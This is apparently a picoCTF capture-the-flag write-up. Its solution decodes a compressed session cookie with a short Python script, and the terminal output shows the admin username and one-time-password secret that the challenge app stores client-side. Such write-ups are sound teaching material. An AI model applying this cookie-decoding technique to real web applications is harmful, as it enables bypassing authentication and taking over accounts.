#### Descripción 
Seems like some data has been leaked! Can you get the flag?
You can get started [here](http://foggy-cliff.picoctf.net:52742/) to find the flag!
The application code can be found [here](https://challenge-files.picoctf.net/c_foggy_cliff/9342e00a35b21ea486d318abf686f53e88cbc6c8c1737f1fd21d2f14a800a7bb/app.py).
The leaked data can be found [here](https://challenge-files.picoctf.net/c_foggy_cliff/9342e00a35b21ea486d318abf686f53e88cbc6c8c1737f1fd21d2f14a800a7bb/users.db).
#### Solución
 ```
 cat << 'EOF' > decode_cookie.py
import zlib
import base64

cookie_data = ".eJwty0sKgCAQANC7zFoiwZz0MiE5ieAPnVbR3XPR9sF7INUQyIOFy6VBIKByOwadnXiiQo2_ccw02OUGViIqRLkrXFZjtMRNwD2oF5dpJudzLPB-SQwcdQ.acjehw.O54muZ9efdV6KnCGET5mkGtvfk0"

decoded = base64.urlsafe_b64decode(cookie_data + "==")
decompressed = zlib.decompress(decoded)
print(decompressed.decode())
EOF

SebAcuna-picoctf@webshell:~/noFa$ cat << 'EOF' > decode_cookie.py
> import zlib
> import base64
> 
> cookie_data = ".eJwty0sKgCAQANC7zFqCibERLxNSkwj-UFtFd89F2wfvgVi8lxMsXC52AQVl1L3L0WRM1Ij82whJ-nCpgkVmYka90UJoyKxawd2lZZdkJnemkOH9AEXSHGI.acjdbA.lbTHTKZkwopfhn0akQpE3iAzbPQ"
> 
> decoded = base64.urlsafe_b64decode(cookie_data + "==")
> decompressed = zlib.decompress(decoded)
> print(decompressed.decode())
> EOF
SebAcuna-picoctf@webshell:~/noFa$ python3 decode_cookie.py
{"logged":"false","otp_secret":"5117","otp_timestamp":1774771564.4184825,"username":"admin"}
SebAcuna-picoctf@webshell:~/noFa$ cat << 'EOF' > decode_cookie.py
> import zlib
> import base64
> 
> cookie_data = ".eJwty0sKgCAQANC7zFoiwZz0MiE5ieAPnVbR3XPR9sF7INUQyIOFy6VBIKByOwadnXiiQo2_ccw02OUGViIqRLkrXFZjtMRNwD2oF5dpJudzLPB-SQwcdQ.acjehw.O54muZ9efdV6KnCGET5mkGtvfk0"
> 
> decoded = base64.urlsafe_b64decode(cookie_data + "==")
> decompressed = zlib.decompress(decoded)
> print(decompressed.decode())
> EOF
SebAcuna-picoctf@webshell:~/noFa$ python3 decode_cookie.py
{"logged":"false","otp_secret":"4767","otp_timestamp":1774771847.0996175,"username":"admin"}
SebAcuna-picoctf@webshell:~/noFa$ ^C
SebAcuna-picoctf@webshell:~/noFa$ 
 ```
#### Notas
#### Referencias
